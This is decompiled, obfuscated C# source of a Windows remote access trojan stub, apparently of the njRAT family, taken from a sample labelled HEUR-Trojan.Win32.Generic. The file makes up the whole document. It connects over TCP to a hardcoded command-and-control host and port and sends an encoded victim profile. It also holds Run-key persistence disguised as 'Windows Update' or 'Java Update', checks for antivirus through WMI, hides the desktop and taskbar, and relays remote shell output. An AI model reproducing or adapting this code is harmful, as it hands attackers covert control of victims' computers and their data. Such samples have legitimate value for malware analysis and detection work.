// Decompiled with JetBrains decompiler
// Type: @Ә
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A333FCE7-81CE-4CAF-8053-DB422244ECF1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-a6a135c2b4d2e961071a0291c88f3690fe0734ba8f8b54b41ef339d643325fb9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0040Ә
{
  private static object \u0040ӓ;
  public const int \u0040Ӕ = 128;
  public const int \u0040ӕ = 64;
  private const int \u0040Ӗ = 20;
  private const int \u0040ӗ = 1;
  public const int \u0040Ә = 128;
  public const int \u0040ә = 64;
  public static string \u0040Ӛ = "[endof]";
  private const int \u0040ӛ = 20;
  private const int \u0040Ӝ = 1;
  private static byte[] \u0040ӝ = new byte[5121];
  public static bool \u0040Ӟ = Conversions.ToBoolean("False");
  public static TcpClient \u0040ӟ = (TcpClient) null;
  public static bool \u0040Ӡ = false;
  public static string \u0040ӡ = "TEMP";
  public static string \u0040Ӣ = "server.exe";
  public static Computer \u0040ӣ = new Computer();
  public static FileStream \u0040Ӥ;
  public static string \u0040ӥ = "NS42FRANSESCOS40OS4xNjkStrik";
  public static string \u0040Ӧ = "";
  public static string \u0040ӧ = "Windows to Erorr ";
  public static string \u0040Ө = "Windows Erorr";
  public static string \u0040ө = "Microsoft Corporation";
  public static string \u0040Ӫ = "Windows Update";
  public static string \u0040ӫ = "10";
  public static string \u0040Ӭ = "Explower";
  public static string \u0040ӭ = "Notepad.exe";
  public static string \u0040Ӯ = "[k]";
  public static string \u0040ӯ = "";
  public static string \u0040Ӱ = "Java Update";
  public static string \u0040ӱ = "Adobe Update";
  public static string \u0040Ӳ = "system";
  public static string \u0040ӳ = "SoftwareMicrosoftWindowsCurrentVersionRun";
  public static string \u0040Ӵ = "";
  public static string \u0040ӵ = "[i]";
  public static string \u0040Ӷ = "[Software\\Microsoft\\Windows\\CurrentVersion\\Run]";
  public static bool \u0040ӷ = Conversions.ToBoolean("False");
  public static bool \u0040Ӹ = Conversions.ToBoolean("False");
  public static bool \u0040ӹ = Conversions.ToBoolean("False");
  public static bool \u0040Ӻ = Conversions.ToBoolean("True");
  public static bool \u0040ӻ = Conversions.ToBoolean("False");
  public static bool \u0040Ӽ = Conversions.ToBoolean("False");
  public static bool \u0040ӽ = Conversions.ToBoolean("False");
  public static bool \u0040Ӿ = Conversions.ToBoolean("False");
  public static bool \u0040ӿ = Conversions.ToBoolean("False");
  public static bool \u0040Ԁ = Conversions.ToBoolean("False");
  public static bool \u0040ԁ = Conversions.ToBoolean("True");
  public static bool \u0040Ԃ = Conversions.ToBoolean("False");
  public static bool \u0040ԃ = Conversions.ToBoolean("False");
  public static bool \u0040Ԅ = Conversions.ToBoolean("False");
  public static bool \u0040ԅ = Conversions.ToBoolean("False");
  public static bool \u0040Ԇ = Conversions.ToBoolean("False");
  public static bool \u0040ԇ = Conversions.ToBoolean("False");
  public static bool \u0040Ԉ = Conversions.ToBoolean("False");
  public static bool \u0040ԉ = Conversions.ToBoolean("False");
  public static bool \u0040Ԋ = Conversions.ToBoolean("False");
  public static bool \u0040ԋ = Conversions.ToBoolean("False");
  public static bool \u0040Ԍ = Conversions.ToBoolean("False");
  public static bool \u0040ԍ = Conversions.ToBoolean("False");
  public static bool \u0040Ԏ = Conversions.ToBoolean("False");
  public static bool \u0040ԏ = Conversions.ToBoolean("False");
  public static bool \u0040Ԑ = Conversions.ToBoolean("False");
  public static bool \u0040ԑ = Conversions.ToBoolean("False");
  public static bool \u0040Ԓ = Conversions.ToBoolean("False");
  public static bool \u0040ԓ = Conversions.ToBoolean("False");
  public static bool \u0040Ԕ = Conversions.ToBoolean("False");
  public static bool \u0040ԕ = Conversions.ToBoolean("False");
  public static bool \u0040Ԗ = Conversions.ToBoolean("False");
  public static bool \u0040ԗ = Conversions.ToBoolean("False");
  public static bool \u0040Ԙ = Conversions.ToBoolean("False");
  public static bool \u0040ԙ = Conversions.ToBoolean("False");
  public static bool \u0040Ԛ = Conversions.ToBoolean("False");
  public static bool \u0040ԛ = Conversions.ToBoolean("False");
  public static bool \u0040Ԝ = Conversions.ToBoolean("False");
  public static bool \u0040ԝ = Conversions.ToBoolean("False");
  public static bool \u0040Ԟ = Conversions.ToBoolean("False");
  public static bool \u0040ԟ = Conversions.ToBoolean("False");
  public static bool \u0040Ԡ = Conversions.ToBoolean("False");
  public static bool \u0040ԡ = Conversions.ToBoolean("False");
  public static bool \u0040Ԣ = Conversions.ToBoolean("False");
  public static bool \u0040ԣ = Conversions.ToBoolean("False");
  public static bool \u0040Ԥ = Conversions.ToBoolean("False");
  public static bool \u0040ԥ = Conversions.ToBoolean("False");
  public static bool \u0040Ԧ = Conversions.ToBoolean("False");
  public static bool \u0040ԧ = Conversions.ToBoolean("False");
  public static bool \u0040Ԩ = Conversions.ToBoolean("False");
  public static bool \u0040ԩ = Conversions.ToBoolean("False");
  public static bool \u0040Ԫ = Conversions.ToBoolean("True");
  public static bool \u0040ԫ = Conversions.ToBoolean("False");
  public static bool \u0040Ԭ = Conversions.ToBoolean("True");
  public static bool \u0040ԭ = Conversions.ToBoolean("False");
  public static bool \u0040Ԯ = Conversions.ToBoolean("False");
  public static bool \u0040ԯ = Conversions.ToBoolean("False");
  public static bool \u0040\u0530 = Conversions.ToBoolean("False");
  private static string \u0040Ա = "";
  public static FileInfo \u0040Բ = new FileInfo(Assembly.GetEntryAssembly().Location);
  private static MemoryStream \u0040Գ = new MemoryStream();
  public static object \u0040Դ = (object) null;
  public static string \u0040Ե = "MTcyOA==";
  public static object \u0040Զ = (object) null;
  public static string \u0040Է = "600b32be8bfe1c7c27485b0edc2c7843";
  public static string \u0040Ը = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  public static string \u0040Թ = "SGFjS2Vk";
  public static string \u0040Ժ = "0.7d";
  public static string \u0040Ի = "|'|'|";

  [DebuggerNonUserCode]
  public \u0040Ә()
  {
  }

  private static void \u0040Լ(object _param0) => \u0040Ә.\u0040ռ((byte[]) _param0);

  private static void \u0040Խ(object _param0, SessionEndingEventArgs _param1) => \u0040Ә.\u0040Ն();

  public static string \u0040Ծ()
  {
    string str1;
    try
    {
      IntPtr num = \u0040Ә.\u0040Ո();
      if (num == IntPtr.Zero)
        return "";
      string str2 = Strings.Space(checked (\u0040Ә.\u0040Ջ((long) num) + 1));
      \u0040Ә.\u0040Պ(num, ref str2, str2.Length);
      str1 = \u0040Ә.\u0040Շ(ref str2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str1 = "";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string \u0040Կ(ref byte[] _param0) => Encoding.UTF8.GetString(_param0);

  public static bool \u0040Հ()
  {
    try
    {
      int num1 = 0;
      do
      {
        string str1 = (string) null;
        int num2 = (int) checked ((short) num1);
        string str2 = Strings.Space(100);
        ref string local1 = ref str2;
        ref string local2 = ref str1;
        if (\u0040Ә.\u0040Ձ((short) num2, ref local1, 100, ref local2, 100))
          return true;
        checked { ++num1; }
      }
      while (num1 <= 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return false;
  }

  public static bool \u0040Ձ(
    short _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3,
    int _param4)
  {
    bool flag;
    return flag;
  }

  private static bool \u0040Ղ(FileInfo _param0, FileInfo _param1)
  {
    if (Operators.CompareString(_param0.Name.ToLower(), _param1.Name.ToLower(), false) != 0)
      return false;
    DirectoryInfo directoryInfo1 = _param0.Directory;
    DirectoryInfo directoryInfo2 = _param1.Directory;
    while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
    {
      directoryInfo1 = directoryInfo1.Parent;
      directoryInfo2 = directoryInfo2.Parent;
      if (directoryInfo1 == null & directoryInfo2 == null)
        return true;
      if (directoryInfo1 == null || directoryInfo2 == null)
        return false;
    }
    return false;
  }

  public static bool \u0040Ճ()
  {
    \u0040Ә.\u0040Ӡ = false;
    Thread.Sleep(2000);
    lock (\u0040Ә.\u0040Բ)
    {
      try
      {
        if (\u0040Ә.\u0040ӟ != null)
        {
          try
          {
            \u0040Ә.\u0040ӟ.Close();
            \u0040Ә.\u0040ӟ = (TcpClient) null;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          \u0040Ә.\u0040Գ.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0040Ә.\u0040Գ = new MemoryStream();
        \u0040Ә.\u0040ӟ = new TcpClient();
        \u0040Ә.\u0040ӟ.ReceiveBufferSize = 204800;
        \u0040Ә.\u0040ӟ.SendBufferSize = 204800;
        \u0040Ә.\u0040ӟ.Client.SendTimeout = 10000;
        \u0040Ә.\u0040ӟ.Client.ReceiveTimeout = 10000;
        \u0040Ә.\u0040ӟ.Connect(\u0040Ә.\u0040ӥ, Conversions.ToInteger(\u0040Ә.\u0040Ե));
        \u0040Ә.\u0040Ӡ = true;
        \u0040Ә.\u0040\u0589(\u0040Ә.\u0040վ());
        try
        {
          string str1;
          string str2;
          if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ("vn", (object) "")), (object) "", false))
          {
            str2 = str1 + \u0040Ә.\u0040Մ(ref \u0040Ә.\u0040Թ) + "<9";
          }
          else
          {
            string str3 = str1;
            string str4 = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ("vn", (object) "")));
            string str5 = \u0040Ә.\u0040Մ(ref str4);
            str2 = str3 + str5 + "<9";
          }
          string str6 = str2 + \u0040Ә.\u0040ӥ + \u0040Ә.\u0040Ӧ + \u0040Ә.\u0040ӧ + \u0040Ә.\u0040Ө + \u0040Ә.\u0040Ӵ + \u0040Ә.\u0040ө + \u0040Ә.\u0040Ӫ + \u0040Ә.\u0040ӫ + \u0040Ә.\u0040Ӭ + \u0040Ә.\u0040ӭ + \u0040Ә.\u0040Ӷ + \u0040Ә.\u0040Ӯ + \u0040Ә.\u0040Ӱ + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040ӯ + \u0040Ә.\u0040Ӳ + \u0040Ә.\u0040ӵ + \u0040Ә.\u0040Ի + ":" + \u0040Ә.\u0040Ե + ":" + \u0040Ә.\u0040Ե + "<9" + \u0040Ә.\u0040ӡ + "<9" + \u0040Ә.\u0040Ӣ + "<9" + Conversions.ToString(\u0040Ә.\u0040ӷ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ӹ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ӹ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ӻ) + "<" + Conversions.ToString(\u0040Ә.\u0040ӻ) + "9<" + Conversions.ToString(\u0040Ә.\u0040Ӽ) + "9<" + Conversions.ToString(\u0040Ә.\u0040ӽ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ӿ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ӿ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԁ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԁ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԃ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԃ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԅ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԅ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԇ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԇ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԉ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԉ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԋ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԋ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԍ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԍ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԏ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԏ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԑ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԑ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԓ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԓ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԍ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԕ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԙ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԗ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԩ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԛ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԙ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԕ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԗ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԛ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԝ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԝ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԯ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԟ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԡ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԟ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԧ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԣ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԣ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԡ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԧ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԩ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԥ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԭ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԥ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԫ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԫ) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ԭ) + "<9" + Conversions.ToString(\u0040Ә.\u0040ԯ) + "<9" + Conversions.ToString(\u0040Ә.\u0040\u0530) + "<9" + Conversions.ToString(\u0040Ә.\u0040Ӟ);
          \u0040Ә.\u0040\u0589("inf" + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Շ(ref str6));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        \u0040Ә.\u0040Ӡ = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    return \u0040Ә.\u0040Ӡ;
  }

  public static string \u0040Մ(ref string _param0)
  {
    byte[] numArray = Convert.FromBase64String(_param0);
    return \u0040Ә.\u0040Կ(ref numArray);
  }

  public static void \u0040Յ(string _param0)
  {
    try
    {
      \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey("Software\\" + \u0040Ә.\u0040Է, true).DeleteValue(_param0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0040Ն() => \u0040Ә.\u0040ֆ(0);

  public static string \u0040Շ(ref string _param0) => Convert.ToBase64String(\u0040Ә.\u0040\u0588(ref _param0));

  public static IntPtr \u0040Ո()
  {
    IntPtr num;
    return num;
  }

  private static int \u0040Չ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    ref int _param3,
    ref int _param4,
    ref int _param5,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param6,
    int _param7)
  {
    int num;
    return num;
  }

  public static int \u0040Պ(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2)
  {
    int num;
    return num;
  }

  public static int \u0040Ջ(long _param0)
  {
    int num;
    return num;
  }

  public static object \u0040Ռ(string _param0, object _param1)
  {
    object objectValue;
    try
    {
      objectValue = RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey("Software\\" + \u0040Ә.\u0040Է).GetValue(_param0, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(_param1)))));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      objectValue = RuntimeHelpers.GetObjectValue(_param1);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return objectValue;
  }

  public static string \u0040Ս()
  {
    string str;
    int num1;
    try
    {
label_2:
      int num2 = 1;
      object obj = (object) "Select * From AntiVirusProduct";
label_3:
      num2 = 2;
      object objectValue1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2"))))))));
label_4:
      num2 = 3;
      object[] Arguments = new object[1]
      {
        RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))))))
      };
      bool[] CopyBack = new bool[1]{ true };
      if (CopyBack[0])
        obj = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0])))))));
      object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue1))), (System.Type) null, "ExecQuery", Arguments, (string[]) null, (System.Type[]) null, CopyBack))))))));
label_7:
      num2 = 4;
      IEnumerator enumerator = ((IEnumerable) objectValue2).GetEnumerator();
      goto label_12;
label_9:
      int num3 = 1;
label_10:
      num2 = 6;
      object objectValue3;
      str = NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue3))), (System.Type) null, "displayName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null).ToString();
      goto label_20;
label_12:
      if (enumerator.MoveNext())
      {
        objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)))))));
        goto label_9;
      }
      else if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
label_16:
      num2 = 8;
      str = "Couldn´t detect AV";
      goto label_20;
label_18:
      num1 = num2;
      switch (num3)
      {
        case 1:
          num1 = 0;
          switch (checked (num1 + 1))
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_7;
            case 5:
              goto label_9;
            case 6:
              goto label_10;
            case 7:
              num2 = 7;
              goto label_12;
            case 8:
              goto label_16;
          }
          break;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
      goto label_18;
    }
label_20:
    if (num1 == 0)
      ;
    return str;
  }

  public static string \u0040Վ()
  {
    string str1;
    try
    {
      string str2 = (string) null;
      int num1 = 0;
      int num2 = 0;
      string str3 = (string) null;
      string str4 = Interaction.Environ("SystemDrive") + "\\";
      int Number;
      \u0040Ә.\u0040Չ(ref str4, ref str2, 0, ref Number, ref num1, ref num2, ref str3, 0);
      str1 = Conversion.Hex(Number);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str1 = "ERR";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static byte[] \u0040Տ(byte[] _param0, ref bool _param1)
  {
    if (_param1)
    {
      object Instance1 = (object) new MemoryStream();
      object Instance2 = (object) new GZipStream((Stream) Instance1, CompressionMode.Compress, true);
      object Instance3 = Instance2;
      object[] objArray1 = new object[3]
      {
        (object) _param0,
        (object) 0,
        (object) _param0.Length
      };
      object[] Arguments1 = objArray1;
      bool[] flagArray1 = new bool[3]{ true, false, false };
      bool[] CopyBack1 = flagArray1;
      NewLateBinding.LateCall(Instance3, (System.Type) null, "Write", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
      if (flagArray1[0])
        _param0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
      NewLateBinding.LateCall(Instance2, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateSet(Instance1, (System.Type) null, "Position", new object[1]
      {
        (object) 0
      }, (string[]) null, (System.Type[]) null);
      byte[] numArray = new byte[checked (Conversions.ToInteger(NewLateBinding.LateGet(Instance1, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)) + 1)];
      object Instance4 = Instance1;
      object[] objArray2 = new object[3]
      {
        (object) numArray,
        (object) 0,
        (object) numArray.Length
      };
      object[] Arguments2 = objArray2;
      bool[] flagArray2 = new bool[3]{ true, false, false };
      bool[] CopyBack2 = flagArray2;
      NewLateBinding.LateCall(Instance4, (System.Type) null, "Read", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
      if (flagArray2[0])
        numArray = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
      NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      return numArray;
    }
    object Instance5 = (object) new MemoryStream(_param0);
    object Instance6 = (object) new GZipStream((Stream) Instance5, CompressionMode.Decompress);
    byte[] numArray1 = new byte[4];
    NewLateBinding.LateSet(Instance5, (System.Type) null, "Position", new object[1]
    {
      Operators.SubtractObject(NewLateBinding.LateGet(Instance5, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 5)
    }, (string[]) null, (System.Type[]) null);
    object Instance7 = Instance5;
    object[] objArray3 = new object[3]
    {
      (object) numArray1,
      (object) 0,
      (object) 4
    };
    object[] Arguments3 = objArray3;
    bool[] flagArray3 = new bool[3]{ true, false, false };
    bool[] CopyBack3 = flagArray3;
    NewLateBinding.LateCall(Instance7, (System.Type) null, "Read", Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
    if (flagArray3[0])
      numArray1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (byte[]));
    int int32 = BitConverter.ToInt32(numArray1, 0);
    NewLateBinding.LateSet(Instance5, (System.Type) null, "Position", new object[1]
    {
      (object) 0
    }, (string[]) null, (System.Type[]) null);
    byte[] numArray2 = new byte[checked (int32 - 1 + 1)];
    object Instance8 = Instance6;
    object[] objArray4 = new object[3]
    {
      (object) numArray2,
      (object) 0,
      (object) int32
    };
    object[] Arguments4 = objArray4;
    bool[] flagArray4 = new bool[3]{ true, false, true };
    bool[] CopyBack4 = flagArray4;
    NewLateBinding.LateCall(Instance8, (System.Type) null, "Read", Arguments4, (string[]) null, (System.Type[]) null, CopyBack4, true);
    if (flagArray4[0])
      numArray2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof (byte[]));
    if (flagArray4[2])
    {
      int num = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[2]), typeof (int));
    }
    NewLateBinding.LateCall(Instance6, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(Instance5, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    return numArray2;
  }

  public static string \u0040Ր()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      IntPtr num4 = \u0040Ӛ.\u0040ӟ("ProgMan", (string) null);
label_3:
      num3 = 3;
      num4 = \u0040Ӛ.\u0040Ӡ(num4, 5U);
label_4:
      num3 = 4;
      if (!\u0040Ӛ.\u0040ӡ(num4))
        goto label_6;
label_5:
      num3 = 5;
      \u0040Ӛ.\u0040Ӣ(num4, 0);
      goto label_8;
label_6:
      num3 = 7;
label_7:
      num3 = 8;
      \u0040Ӛ.\u0040Ӣ(num4, 4);
label_8:
      goto label_15;
label_10:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num5 = num2 + 1;
          num2 = 0;
          switch (num5)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
            case 9:
              goto label_8;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 10:
              goto label_15;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_10;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_15:
    string str1;
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  [DllImport("user32.dll", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040Ց(
    int _param0,
    int _param1,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param2,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3);

  private static void \u0040Ւ(object _param0, object _param1)
  {
    try
    {
      string ի = \u0040Ә.\u0040Ի;
      object Instance = _param1;
      string str1 = Conversions.ToString(NewLateBinding.LateGet(Instance, (System.Type) null, "Data", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      string str2 = \u0040Ә.\u0040Շ(ref str1);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "Data", new object[1]
      {
        (object) str1
      }, (string[]) null, (System.Type[]) null, true, false);
      \u0040Ә.\u0040\u0589("rs" + ի + str2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private static void \u0040Փ()
  {
    try
    {
      \u0040Ә.\u0040\u0589("rsc");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string \u0040Ք()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      long num4 = (long) \u0040Ӛ.\u0040ӟ("Shell_TrayWnd", (string) null);
label_3:
      num3 = 3;
      int num5 = checked ((int) num4);
      string str1 = "ReBarWindow32";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      long num6 = (long) \u0040Ә.\u0040Ց(num5, 0, ref local1, ref local2);
label_4:
      num3 = 4;
      \u0040Ӛ.\u0040Ӣ((IntPtr) num6, 1);
      goto label_11;
label_6:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num7 = num2 + 1;
          num2 = 0;
          switch (num7)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_11;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_6;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_11:
    string str3;
    string str4 = str3;
    if (num2 == 0)
      return str4;
    ProjectData.ClearProjectError();
    return str4;
  }

